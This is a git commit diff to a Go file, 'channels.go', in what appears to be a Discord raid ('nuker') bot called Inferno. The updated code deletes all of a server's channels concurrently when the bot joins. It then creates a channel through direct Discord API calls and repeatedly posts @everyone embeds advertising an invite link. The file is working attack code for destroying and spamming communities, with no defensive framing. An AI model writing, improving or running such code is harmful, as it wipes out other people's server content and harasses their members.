a3155ebf38da896d6d62343583d071b2565f4e52
N77R <100294280+n7tr@users.noreply.github.com>
2024-01-18 15:38:21 +0300

    Update channels.go

--- Inferno/cogs/channels.go
+++ Inferno/cogs/channels.go
@@ -1,25 +1,30 @@
 package cogs
 
 import (
+	"encoding/json"
 	"fmt"
-	"github.com/bwmarrin/discordgo"
-	"github.com/joho/godotenv"
 	"os"
 	"sync"
+	"time"
+
+	"github.com/bwmarrin/discordgo"
+	"github.com/joho/godotenv"
 )
 
-func DeleteChannels(s *discordgo.Session, event *discordgo.GuildCreate) {
-	channels, _ := s.GuildChannels(event.ID)
-
+func DeleteChannels(s *discordgo.Session, channels []*discordgo.Channel, wg *sync.WaitGroup) {
 	for _, channel := range channels {
-		s.ChannelDelete(channel.ID)
+		wg.Add(1)
+		go func(ch *discordgo.Channel) {
+			defer wg.Done()
+			s.ChannelDelete(ch.ID)
+		}(channel)
 	}
 }
 
 func TextSpam(s *discordgo.Session, event *discordgo.GuildCreate, wg *sync.WaitGroup) {
 	godotenv.Load()
+
 	CHANNEL_NAME := os.Getenv("CHANNEL_NAME")
-	channelName := fmt.Sprintf(CHANNEL_NAME)
 	EMBED_DESCRIPTION := os.Getenv("EMBED_DESCRIPTION")
 	EMBED_TITLE := os.Getenv("EMBED_TITLE")
 	AVATAR_URL := os.Getenv("AVATAR_URL")
@@ -30,19 +35,43 @@ func TextSpam(s *discordgo.Session, event *discordgo.GuildCreate, wg *sync.WaitG
 
 	embed := discordgo.MessageEmbed{
 		Title:       EMBED_TITLE,
-		Description: EMBED_DESCRIPTION + + "\n\n" + "**Support server's invite:** **https://discord.gg/wdGF9WdFTD**" + "\n" + "\n> **Bot joined at:** " + "`" + fmt.Sprint(event.JoinedAt) + "`\n\n",
+		Description: EMBED_DESCRIPTION + "\n\n" + "**Server invite:** **https://discord.gg/53YekCPSAE**" + "\n" + "\n> **Bot joined at:** " + "`" + fmt.Sprint(event.JoinedAt) + "`\n\n",
 		Color:       00255,
 		Thumbnail:   &thumbnail,
 	}
 
-	data := discordgo.MessageSend{
+	dataMsg := discordgo.MessageSend{
 		Content: "@everyone",
 		Embeds:  []*discordgo.MessageEmbed{&embed},
 	}
 
-	channel, _ := s.GuildChannelCreate(event.ID, channelName, discordgo.ChannelTypeGuildText)
+	dataMap := map[string]string{"name": string(CHANNEL_NAME), "type": "0"}
+	jsonData, _ := json.Marshal(dataMap)
+
+	data := Sendhttp("https://discord.com/api/v9/guilds/"+event.ID+"/channels", "POST", jsonData)
+
+	time.Sleep(2 * time.Second)
+
+	type ResponseData struct {
+		ID string `json:"id"`
+	}
+
+	var responseData ResponseData
+	err := json.Unmarshal([]byte(data), &responseData)
+	if err != nil {
+		fmt.Println("There's an error while decoding JSON:", err)
+		return
+	}
+
+	jsonData, _ = json.Marshal(dataMsg)
 
 	for i := 0; i < 6; i++ {
-		s.ChannelMessageSendComplex(channel.ID, &data)
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			Sendhttp("https://discord.com/api/v9/channels/"+responseData.ID+"/messages", "POST", jsonData)
+		}()
+		time.Sleep(time.Second)
+
 	}
 }
